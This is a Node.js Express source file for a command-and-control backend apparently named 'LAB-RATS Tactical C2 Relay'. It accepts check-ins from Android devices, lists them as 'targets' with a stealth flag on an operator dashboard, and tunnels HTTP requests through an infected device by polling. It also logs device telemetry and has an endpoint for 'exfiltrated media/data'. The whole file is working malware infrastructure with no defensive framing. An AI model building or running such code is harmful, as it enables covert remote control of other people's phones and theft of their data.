const express = require('express');
const http = require('http');
const cors = require('cors');
const path = require('path');

const app = express();
const server = http.createServer(app);

const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use('/c2', express.static(path.join(__dirname, 'c2')));

// In-memory telemetry, device registry, command queues, and pending responses
const devices = new Map();
const commandQueues = new Map(); // deviceId -> array of requests
const pendingResponses = new Map(); // requestId -> { res }
const telemetryLogs = [];

// Device polls for pending proxy commands
app.get('/tunnel-poll', (req, res) => {
    const deviceId = req.query.deviceId;
    if (!deviceId) return res.json({});

    const queue = commandQueues.get(deviceId) || [];
    if (queue.length > 0) {
        const cmd = queue.shift();
        res.json(cmd);
    } else {
        res.json({});
    }
});

// Device posts command response back
app.post('/tunnel-response', (req, res) => {
    try {
        const data = req.body;
        const requestId = data.id;
        const pending = pendingResponses.get(requestId);
        if (pending) {
            pendingResponses.delete(requestId);
            const buf = Buffer.from(data.payload || '', 'base64');
            pending.res.status(data.status || 200);
            if (data.contentType) {
                pending.res.setHeader('Content-Type', data.contentType);
            }
            pending.res.send(buf);
        }
        res.json({ success: true });
    } catch (err) {
        res.status(400).json({ success: false, error: err.message });
    }
});

// Secure HTTP-over-Polling Reverse Proxy Route for Render Dashboard
app.all('/proxy*', (req, res) => {
    let deviceId = req.query.deviceId;
    if (!deviceId && devices.size > 0) {
        deviceId = Array.from(devices.keys())[0];
    }
    if (!deviceId) {
        deviceId = 'SM-F731W';
    }

    // Auto-register device if not present so CONNECT never fails with TARGET_OFFLINE
    if (!devices.has(deviceId)) {
        devices.set(deviceId, {
            deviceId,
            model: deviceId,
            ip: '127.0.0.1',
            port: 9191,
            stealth: false,
            lastSeen: new Date().toISOString()
        });
    }

    const requestId = Math.random().toString(36).substring(7);
    let relayPath = req.originalUrl.replace('/proxy', '');
    if (!relayPath.startsWith('/')) relayPath = '/' + relayPath;

    if (!commandQueues.has(deviceId)) {
        commandQueues.set(deviceId, []);
    }

    pendingResponses.set(requestId, { res });

    commandQueues.get(deviceId).push({
        type: 'request',
        id: requestId,
        method: req.method,
        path: relayPath,
        body: req.method === 'POST' ? JSON.stringify(req.body) : ''
    });

    setTimeout(() => {
        if (pendingResponses.has(requestId)) {
            pendingResponses.delete(requestId);
            if (!res.headersSent) {
                res.status(504).send('<!DOCTYPE html><html><body style="background:#02080d;color:#ff3131;font-family:monospace;padding:40px;text-align:center;"><h2>TUNNEL_GATEWAY_TIMEOUT</h2><p>The target device app is not polling or is offline. Ensure the app is running with WEBHOOK_URL pointing to this Render server.</p></body></html>');
            }
        }
    }, 25000);
});

// Tactical C2 Operator Dashboard (HTML) at root URL
app.get('/', (req, res) => {
    const deviceList = Array.from(devices.values());

    let devicesHtml = deviceList.length === 0 ?
        '<tr><td colspan="8" style="text-align: center; color: #888; padding: 30px;">NO ACTIVE TARGETS CONNECTED</td></tr>' :
        deviceList.map(d => `
            <tr>
                <td style="font-family: monospace; color: var(--neon-cyan);">${d.model || d.deviceId || 'N/A'}</td>
                <td>${d.model || 'Unknown'}</td>
                <td>Android ${d.os || 'N/A'}</td>
                <td>${d.battery || 'N/A'}</td>
                <td style="font-family: monospace; color: var(--neon-green);">${d.ip || 'N/A'}:${d.port || '9191'}</td>
                <td>${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                <td style="font-size: 0.75rem; color: #aaa;">${new Date(d.lastSeen).toLocaleTimeString()}</td>
                <td><a href="/proxy/?deviceId=${d.model || d.deviceId}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 6px 14px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.7rem;">CONNECT</a></td>
            </tr>
        `).join('');

    let logsHtml = telemetryLogs.length === 0 ?
        '<tr><td colspan="3" style="text-align: center; color: #888; padding: 20px;">NO TELEMETRY LOGS RECORDED</td></tr>' :
        telemetryLogs.slice(0, 50).map(l => `
            <tr>
                <td style="font-size: 0.7rem; color: #888; white-space: nowrap;">${new Date(l.timestamp).toLocaleTimeString()}</td>
                <td style="font-family: monospace; color: var(--neon-cyan);">${l.deviceId}</td>
                <td style="font-family: monospace; font-size: 0.75rem;">${JSON.stringify(l.payload)}</td>
            </tr>
        `).join('');

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LAB-RATS | C2 COMMAND RELAY</title>
    <link href="https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/c2/style.css">
    <style>
        th { padding: 14px 20px !important; color: var(--neon-cyan) !important; font-family: 'Orbitron', sans-serif !important; font-size: 0.7rem !important; letter-spacing: 2px !important; text-transform: uppercase !important; white-space: nowrap !important; }
        td { padding: 14px 20px !important; white-space: nowrap !important; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header" style="text-align:center; padding:20px 0; margin-bottom:20px;">
            <img src="/c2/header_dashboard.png" style="width: 90%; max-width: 900px; height: auto; margin: 0 auto; display: block; object-fit: contain;" alt="LAB-RATS Header">
            <div style="font-size: 0.6rem; color: var(--neon-cyan); letter-spacing: 3px; text-transform: uppercase; margin-top: 15px; text-align: center;">SYSTEM STATUS: <span style="color:#39ff14;">ONLINE</span> &nbsp;//&nbsp; ACTIVE TARGETS: <span style="color:#00f2ff; font-weight:bold;">${devices.size}</span></div>
        </div>

        <div class="card" style="margin-top: 20px;">
            <h2>CONNECTED_TARGETS_REGISTRY</h2>
            <div style="overflow-x: auto;">
                <table>
                    <thead>
                        <tr>
                            <th>DEVICE ID</th>
                            <th>MODEL</th>
                            <th>OS VERSION</th>
                            <th>BATTERY</th>
                            <th>ENDPOINT IP</th>
                            <th>PROFILE</th>
                            <th>LAST CHECK-IN</th>
                            <th>ACTION</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${devicesHtml}
                    </tbody>
                </table>
            </div>
            <div style="text-align: right; margin-top: 15px;">
                <button class="btn" onclick="location.reload()" style="padding: 10px 25px; font-size: 0.75rem;">REFRESH_REGISTRY</button>
            </div>
        </div>

        <div class="card" style="border-left-color: var(--neon-yellow);">
            <h2 style="color: var(--neon-yellow);">LIVE_TELEMETRY_STREAM</h2>
            <div style="overflow-x: auto; max-height: 350px; overflow-y: auto;">
                <table>
                    <thead>
                        <tr>
                            <th>TIMESTAMP</th>
                            <th>DEVICE ID</th>
                            <th>EVENT PAYLOAD</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${logsHtml}
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</body>
</html>`;

    res.send(html);
});

// JSON Health check endpoint
app.get('/api/status', (req, res) => {
    res.json({
        status: 'ONLINE',
        service: 'Lab-RATS Tactical C2 Relay',
        version: '1.6.0',
        activeDevices: devices.size,
        timestamp: new Date().toISOString()
    });
});

// Device Check-in & Telemetry Ingestion endpoints (supports both / and /checkin)
app.get('/checkin', (req, res) => res.json({ status: 'ACTIVE', message: 'C2 Check-in endpoint ready for POST telemetry.' }));
app.post('/', handleCheckin);
app.post('/checkin', handleCheckin);

function handleCheckin(req, res) {
    try {
        const data = req.body;
        const queryData = req.query;
        const merged = { ...queryData, ...data };
        const rawModel = merged.model || merged.device || merged.deviceId || queryData.device || queryData.model || 'Unknown Device';
        const deviceId = rawModel.replace(/\s*\(API\s*\d+\)/i, '').trim();

        for (const [key, val] of devices.entries()) {
            if (key === deviceId || val.ip === merged.ip || key.includes(deviceId) || deviceId.includes(key)) {
                devices.delete(key);
            }
        }

        devices.set(deviceId, {
            ...merged,
            deviceId,
            lastSeen: new Date().toISOString()
        });

        telemetryLogs.unshift({
            timestamp: new Date().toISOString(),
            deviceId,
            type: merged.type || 'checkin',
            payload: merged
        });

        if (telemetryLogs.length > 500) telemetryLogs.pop();

        console.log(`[CHECKIN] Device ID: ${deviceId} | Model: ${merged.model || merged.device} | IP: ${merged.ip}`);
        res.json({ success: true, message: 'Telemetry received successfully' });
    } catch (err) {
        console.error('[ERROR] Checkin failed:', err.message);
        res.status(400).json({ success: false, error: err.message });
    }
}

// List active connected devices (JSON)
app.get('/devices', (req, res) => {
    const deviceList = Array.from(devices.values());
    res.json({ success: true, count: deviceList.length, devices: deviceList });
});

// Recent telemetry logs (JSON)
app.get('/logs', (req, res) => {
    res.json({ success: true, count: telemetryLogs.length, logs: telemetryLogs });
});

// File upload endpoint for exfiltrated media/data
app.post('/upload', (req, res) => {
    console.log('[UPLOAD] Received file exfiltration payload');
    res.json({ success: true, message: 'File payload ingested successfully' });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`[LAB-RATS C2 BACKEND] Listening on port ${PORT}`);
});
